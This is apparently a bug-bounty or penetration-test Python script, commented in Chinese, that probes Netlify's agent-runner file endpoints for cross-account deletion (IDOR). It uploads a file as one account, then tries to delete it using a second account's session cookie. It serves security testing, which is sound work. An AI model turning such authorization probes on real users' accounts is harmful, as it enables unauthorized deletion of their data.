# -*- coding: utf-8 -*-
"""Netlify:agent-runner-file-delete 交叉账号测试(core)
B 上传文件 → B 自删(基线)→ A 删 B 的文件(越权?)"""
import http.client, ssl, json, sys, time
sys.path.insert(0, r'D:\scan\netlify_report')
from _net_creds import COOKIE_A, COOKIE_B
ctx = ssl.create_default_context()

ACC_A_UUID = '6a979dd2ae93f47d55b62897'
ACC_B_UUID = '6a97b6454fef0db964f75db6'

def req(host, path, method='POST', raw=None, headers=None, cookie=None):
    conn = http.client.HTTPSConnection(host, context=ctx, timeout=25)
    h = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/126.0',
         'Accept': 'application/json', 'Cookie': cookie or COOKIE_A,
         'Origin': 'https://app.netlify.com'}
    if headers:
        h.update(headers)
    conn.request(method, path, body=raw, headers=h)
    r = conn.getresponse(); raw2 = r.read()
    st = r.status; conn.close()
    return st, raw2[:300].decode('utf-8', 'replace')

# 1. B 上传一个新文件(每次唯一名)
fname = 'ar-xdel-%d.txt' % int(time.time())
s, b = req('app.netlify.com', '/api/agent-runner-file-upload?accountId=%s&filename=%s' % (ACC_B_UUID, fname),
           raw=b'victim file content', headers={'Content-Type': 'text/plain'}, cookie=COOKIE_B)
print('B upload:', s, b[:200])
fk = None
try:
    fk = json.loads(b).get('file_key')
except Exception:
    pass
print('B file_key:', fk)
if not fk:
    sys.exit(1)

# 2. B 自己删除(基线)
s, b = req('app.netlify.com', '/.netlify/functions/agent-runner-file-delete?accountId=%s&fileKey=%s' % (ACC_B_UUID, fk),
           cookie=COOKIE_B)
print('B self-delete:', s, b[:200])

# 3. 再上传一个,B 不删,A 来删
fname2 = 'ar-xdel2-%d.txt' % int(time.time())
s, b = req('app.netlify.com', '/api/agent-runner-file-upload?accountId=%s&filename=%s' % (ACC_B_UUID, fname2),
           raw=b'victim file content 2', headers={'Content-Type': 'text/plain'}, cookie=COOKIE_B)
fk2 = json.loads(b).get('file_key')
print('B file_key2:', fk2)
s, b = req('app.netlify.com', '/.netlify/functions/agent-runner-file-delete?accountId=%s&fileKey=%s' % (ACC_B_UUID, fk2),
           cookie=COOKIE_A)
print('A delete B file:', s, b[:200])

# 4. 验证文件是否真的没了:B 再删一次同 key(若 404/文件不存在 = 已被 A 删掉;若 200 = A 没删掉,B 现在删)
s, b = req('app.netlify.com', '/.netlify/functions/agent-runner-file-delete?accountId=%s&fileKey=%s' % (ACC_B_UUID, fk2),
           cookie=COOKIE_B)
print('B re-delete same key:', s, b[:200])
